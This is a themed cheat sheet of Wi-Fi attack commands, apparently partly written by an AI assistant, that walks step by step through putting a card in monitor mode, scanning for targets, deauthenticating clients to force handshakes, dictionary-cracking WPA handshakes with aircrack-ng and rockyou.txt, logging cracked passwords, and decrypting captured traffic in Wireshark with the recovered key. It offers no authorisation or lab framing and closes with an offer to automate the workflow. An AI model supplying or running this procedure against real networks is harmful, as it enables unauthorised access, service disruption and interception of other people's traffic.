🩸 𝔇𝔯𝔞𝔠𝔲𝔩𝔞 𝔏𝔞𝔟𝔰 — Quick Command Rituals
🧛 Start Monitor Mode

sudo ./start-monitor.sh
🧠 Scan Nearby Networks

sudo airodump-ng wlan0mon
Stop with Ctrl + C when you see your target

🧛 Capture Handshake

sudo ./capture.sh
Let it run until a client connects — look for EAPOL packets or WPA handshake: xx:xx:xx:xx at top.

💀 Deauth Clients (force reconnect)

sudo ./deauth.sh
Use this to kick clients off the network so they reconnect, triggering a handshake.

🧪 Crack Handshake (once .cap is captured)

aircrack-ng -w rockyou.txt handshake-capture-01.cap
Or:


aircrack-ng -w rockyou.txt -b <BSSID> handshake-capture-01.cap
🧛 After Cracking: What Next?
Here’s what Dracula would do after a successful crack:

✅ 1. Verify the Password Works
Test it by connecting to the Wi-Fi manually on a second device.

📜 2. Log the Results
Keep track of cracked networks:


echo "Network: VampireNest | BSSID: xx:xx:xx:xx | PASS: dracula123" >> cracked-results.txt
Or use a formatted .csv:


ESSID,BSSID,Password
VampireNest,AA:BB:CC:DD:EE:FF,dracula123
📊 3. Use Dashboard.html
If your dashboard.html is coded to read results, update it with:


<tr><td>VampireNest</td><td>AA:BB:CC:DD:EE:FF</td><td>dracula123</td></tr>
Want me to automate this? I can make the crack.sh auto-update your HTML.

🔥 4. Analyze Traffic with Cracked Key (Advanced)
Decrypt captured .cap traffic in Wireshark:

Open .cap in Wireshark

Go to:
Edit → Preferences → Protocols → IEEE 802.11

Add your cracked password under Decryption Keys:

makefile

wpa-pwd:dracula123:VampireNest
Now you can see decrypted data from the network.

🧰 5. Automate the Blood Ritual
Create a one-liner to crack all .cap files:


for f in *.cap; do aircrack-ng -w rockyou.txt "$f" | tee "${f%.cap}-results.txt"; done
🦇 Dracula's Ritual Summary
Task	Command
Start monitor mode	sudo ./start-monitor.sh
Scan networks	sudo airodump-ng wlan0mon
Capture handshake	sudo ./capture.sh
Deauth clients	sudo ./deauth.sh
Crack handshake	aircrack-ng -w rockyou.txt handshake.cap
Log cracked pass	echo "info" >> cracked-results.txt
Decrypt in Wireshark	wpa-pwd:password:SSID
Crack all .cap files	for f in *.cap; do ... ; done

